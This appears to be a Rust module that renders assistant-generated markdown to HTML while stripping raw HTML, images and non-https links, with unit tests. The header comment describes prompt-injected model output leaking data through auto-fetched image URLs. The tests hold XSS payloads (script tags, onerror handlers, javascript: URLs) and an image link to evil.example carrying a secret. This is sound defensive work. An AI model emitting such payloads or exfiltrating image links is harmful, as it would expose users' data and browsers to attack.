//! Minimal, XSS-safe markdown → HTML for assistant answers.
//!
//! Assistant text is model-generated, so it is untrusted input that ends up in
//! `inner_html`. Every raw-HTML event is dropped before serialising: pulldown-cmark
//! passes `<script>` and friends straight through by default, and nothing the model
//! writes needs raw HTML anyway.
//!
//! Images and non-`https:` links are dropped too. Model output can be steered by
//! text a tool returned (a car note, an earlier report), and an image URL is fetched
//! the moment it renders — an exfiltration channel that needs no click. Links keep
//! their text; only the anchor is removed, so `javascript:` and `data:` URLs never
//! become clickable.

use pulldown_cmark::{Event, Options, Parser, Tag, TagEnd, html};

/// Render markdown to HTML with all raw HTML, images and unsafe links removed.
pub fn render(markdown: &str) -> String {
    let mut options = Options::empty();
    options.insert(Options::ENABLE_TABLES);
    options.insert(Options::ENABLE_STRIKETHROUGH);

    // Links cannot nest in CommonMark, so one flag tracks whether the open link
    // was dropped and its closing tag must be dropped with it.
    let mut dropping_link = false;
    let parser = Parser::new_ext(markdown, options).filter(move |event| match event {
        Event::Html(_) | Event::InlineHtml(_) | Event::FootnoteReference(_) => false,
        // The alt text between these still renders, as plain text.
        Event::Start(Tag::Image { .. }) | Event::End(TagEnd::Image) => false,
        Event::Start(Tag::Link { dest_url, .. }) => {
            dropping_link = !is_safe_link(dest_url);
            !dropping_link
        }
        Event::End(TagEnd::Link) => !std::mem::take(&mut dropping_link),
        _ => true,
    });

    let mut out = String::with_capacity(markdown.len() + markdown.len() / 2);
    html::push_html(&mut out, parser);
    out
}

/// Only absolute `https:` URLs become anchors.
fn is_safe_link(url: &str) -> bool {
    url.trim_start()
        .get(..8)
        .is_some_and(|scheme| scheme.eq_ignore_ascii_case("https://"))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn renders_ordinary_markdown() {
        let out = render("**bold** and a list:\n\n- one\n- two");
        assert!(out.contains("<strong>bold</strong>"), "{out}");
        assert!(out.contains("<li>one</li>"), "{out}");
    }

    #[test]
    fn renders_tables() {
        let out = render("| trip | km |\n| --- | --- |\n| a | 12 |");
        assert!(out.contains("<table>"), "{out}");
        assert!(out.contains("<td>12</td>"), "{out}");
    }

    #[test]
    fn strips_block_level_raw_html() {
        let out = render("before\n\n<script>alert(1)</script>\n\nafter");
        assert!(!out.contains("<script"), "{out}");
        assert!(out.contains("before"), "{out}");
        assert!(out.contains("after"), "{out}");
    }

    #[test]
    fn strips_inline_raw_html() {
        let out = render("hello <img src=x onerror=alert(1)> world");
        assert!(!out.contains("<img"), "{out}");
        assert!(!out.contains("onerror"), "{out}");
        assert!(out.contains("hello"), "{out}");
    }

    #[test]
    fn escapes_angle_brackets_in_text() {
        let out = render("a < b and 5 > 3");
        assert!(!out.contains("a < b"), "{out}");
        assert!(out.contains("&lt;"), "{out}");
    }

    #[test]
    fn escapes_html_inside_code_spans() {
        let out = render("use `<script>` carefully");
        assert!(out.contains("<code>"), "{out}");
        assert!(!out.contains("<script>"), "{out}");
    }

    #[test]
    fn drops_images_but_keeps_their_alt_text() {
        let out = render("see ![the chart](https://evil.example/leak?d=secret) here");
        assert!(!out.contains("<img"), "{out}");
        assert!(!out.contains("evil.example"), "{out}");
        assert!(out.contains("the chart"), "{out}");
    }

    #[test]
    fn keeps_https_links() {
        let out = render("[docs](https://example.com/a)");
        assert!(out.contains("<a href=\"https://example.com/a\""), "{out}");
    }

    #[test]
    fn unwraps_non_https_links_to_plain_text() {
        for url in [
            "javascript:alert(1)",
            "http://example.com",
            "data:text/html,x",
            "/relative",
            "mailto:a@b.c",
        ] {
            let out = render(&format!("[click me]({url}) after"));
            assert!(!out.contains("<a"), "{url}: {out}");
            assert!(out.contains("click me"), "{url}: {out}");
            assert!(out.contains("after"), "{url}: {out}");
        }
    }

    #[test]
    fn a_dropped_link_does_not_swallow_the_next_safe_one() {
        let out = render("[a](javascript:x) and [b](https://ok.example)");
        assert_eq!(out.matches("<a ").count(), 1, "{out}");
        assert!(out.contains("https://ok.example"), "{out}");
        assert!(out.contains("</a>"), "{out}");
    }

    #[test]
    fn empty_input_is_empty_output() {
        assert!(render("").is_empty());
    }
}
